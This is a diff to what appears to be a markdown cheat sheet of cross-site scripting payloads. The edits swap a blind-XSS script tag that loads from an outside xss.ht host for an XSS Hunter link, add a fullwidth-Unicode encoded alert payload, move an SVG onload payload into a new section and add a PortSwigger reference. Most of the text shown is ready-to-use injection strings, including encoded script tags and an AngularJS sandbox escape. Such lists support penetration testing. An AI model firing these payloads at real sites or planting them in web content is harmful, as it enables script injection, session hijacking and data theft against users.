@@ -1,6 +1,6 @@
 > Blind XSS
 
-```<script src=https://a007.xss.ht></script>```
+```https://xsshunter.com/```
 
 
 > Encoding
@@ -9,7 +9,7 @@
 
 ```%253Cscript%253Ealert(1)%253C%252Fscript%253E```
 
-```&lt;script&gt;confirm(1)&lt;/script&gt;```
+```%uff1cscript%uff1ealert(1);%uff1c/script%uff1e```
 
 
 > XML Based XSS
@@ -137,6 +137,9 @@
 
 ```<x ng-app>{{constructor.constructor('alert(1)')()}}```
 
+> When Space and Slash doesnt work
+
+```<svgonload=alert(1)>```
 
 > Misc
 
@@ -145,8 +148,6 @@
 ```window+=valueOf=alert(1)```
 
 ```[cookie].some(alert)```
-
-```<svgonload=alert(1)>```
 
 ```"accesskey=X onclick=alert(1)+```
 
@@ -203,3 +204,4 @@
 
 > Reference
 ```https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/```
+```https://portswigger.net/web-security/cross-site-scripting/cheat-sheet```
